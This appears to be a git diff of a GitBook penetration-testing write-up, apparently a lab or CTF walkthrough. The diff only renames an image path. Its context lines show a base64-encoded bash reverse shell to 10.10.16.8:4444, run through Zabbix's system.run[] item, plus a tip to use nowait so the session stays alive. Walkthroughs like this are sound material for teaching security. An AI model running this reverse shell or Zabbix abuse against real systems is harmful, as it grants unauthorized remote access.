@@ -87,7 +87,7 @@ To execute a reverse shell, used Zabbix's `system.run[]` item:
 echo "bash -i >& /dev/tcp/10.10.16.8/4444 0>&1" | base64
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ⚠️ _Without `nowait`, the session died in \~4 seconds. Annoying little gotcha._
 
